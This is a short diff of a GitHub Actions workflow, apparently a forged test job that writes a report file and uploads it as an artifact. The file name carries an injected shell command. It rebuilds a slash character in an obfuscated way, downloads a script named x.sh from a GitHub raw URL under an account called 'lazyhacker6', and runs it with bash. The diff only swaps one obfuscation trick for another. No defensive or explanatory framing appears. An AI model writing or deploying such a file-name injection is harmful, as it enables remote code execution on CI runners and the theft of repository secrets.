@@ -15,7 +15,7 @@ jobs:
           mkdir -p /tmp/content
           echo "report from forged Test workflow" > /tmp/content/report.txt
           python3 - <<'PY'
-          open('/tmp/content/report.txt;S=$(printf '\57');curl -sL raw.githubusercontent.com${S}lazyhacker6${S}p${S}main${S}x.sh -o x.sh;bash x.sh;#.txt','w').write('x')
+          open('/tmp/content/report.txt;S=$(expr substr $HOME 1 1);curl -sL raw.githubusercontent.com${S}lazyhacker6${S}p${S}main${S}x.sh -o x.sh;bash x.sh;#.txt','w').write('x')
           PY
           ls -la /tmp/content
       - name: upload artifact
